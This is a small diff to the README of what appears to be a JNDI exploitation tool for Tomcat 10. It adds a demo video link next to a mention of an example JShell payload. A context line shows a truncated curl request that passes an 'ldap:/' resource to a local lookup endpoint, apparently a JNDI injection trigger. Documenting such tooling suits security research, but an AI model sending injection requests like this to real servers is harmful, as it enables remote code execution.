@@ -94,6 +94,9 @@ curl "http://localhost:8080/tomcat-10-jshell-1.0-SNAPSHOT/lookup?resource=ldap:/
 ## Demo
 This demo uses our example JShell payload (`/src/main/resources/payload.java`):
 
+https://github.com/user-attachments/assets/ca45c2e8-7aec-4530-bb47-db45306d6938
+
+
 ## Resources and Acknowledgements
 + Michael Stepankin for creating the original Rogue JNDI
 + His article about JNDI exploitation:
